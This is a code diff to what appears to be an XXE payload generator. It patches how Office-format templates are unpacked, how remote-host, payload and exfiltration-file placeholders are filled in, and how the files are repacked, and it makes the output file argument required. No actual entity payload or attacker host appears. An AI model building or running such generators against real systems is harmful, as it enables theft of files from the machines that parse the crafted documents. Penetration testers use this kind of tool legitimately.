@@ -101,22 +101,22 @@ class XXeFile:
     def generate_payload(self):
         tplpath = os.path.join(os.path.dirname(os.path.realpath(__file__)), self.template['template'])
         finalpath = self.outfile
+        print(finalpath)
         if tplpath is not None:
             if self.template['ooxml']:
                 with zipfile.ZipFile(tplpath, 'r') as zip_ref:
                     tempdir = tempfile.mkdtemp(suffix='payload', prefix=self.filetype + '_')
                     zip_ref.extractall(tempdir)
-                    for  fname in glob.glob(tempdir + '/**/*.xml', recursive=True):
-                        tempdat = self.replace_payload_vars(fname)
-                        with zipfile.ZipFile(finalpath, 'w') as final:
-                            final.write(fname)
+                    with zipfile.ZipFile(finalpath, 'w', zipfile.ZIP_DEFLATED) as final:
+                        for fname in glob.glob(tempdir + '/**/*.*', recursive=True):
+                            final.write(fname, fname[len(tempdir)+1:])
             else:
                 replace_payload_vars(tplpath)
         return finalpath
 
     def replace_payload_vars(self, tplpath):
-        with open(tplpath, "r+", encoding="utf8") as tmpl:
 
+        with open(tplpath, "r+", encoding="utf8") as tmpl:
             # Clean payload
             if "__REMOTE_HOST__" in self.payload:
                 self.payload = self.payload.replace("__REMOTE_HOST__", self.host)
@@ -128,6 +128,7 @@ class XXeFile:
                 self.payload = self.payload.replace("__EXFILE__", self.exfile)
 
             # Replace vars in file
+            tmpl.seek(0)
             tempdat = tmpl.read()
             if "__REMOTE_HOST__" in tempdat:
                 tempdat = tempdat.replace("__REMOTE_HOST__", self.protocol + '://' + self.host)
@@ -137,14 +138,17 @@ class XXeFile:
             
             if "__PAYLOAD__" in tempdat:
                 tempdat = tempdat.replace("__PAYLOAD__", self.payload)
+
+            # Seems although we need to seek to the beginning of the file before writing to it
+            tmpl.seek(0)
             tmpl.write(tempdat)
         return tempdat
 
     @property
     def to_file(self):
         tempdat = self.generate_payload()
-        with open(self.outfile, "wb") as out:
-            out.write(bytes(tempdat, "utf8"))
+        # with open(self.outfile, "wb") as out:
+            # out.write(bytes(tempdat, "utf8"))
 
     @property
     def to_text(self):
@@ -185,10 +189,9 @@ def main():
     )
     parser.add_argument(
         "--outfile", 
-        required=False,
-        default=None,
+        required=True,
         type=str, 
-        help="The outfile to use in your outfiles. stdout is used if left blank "
+        help="The resulting payload file. Generated into ./output/"
     )
     parser.add_argument(
         "--exfile",
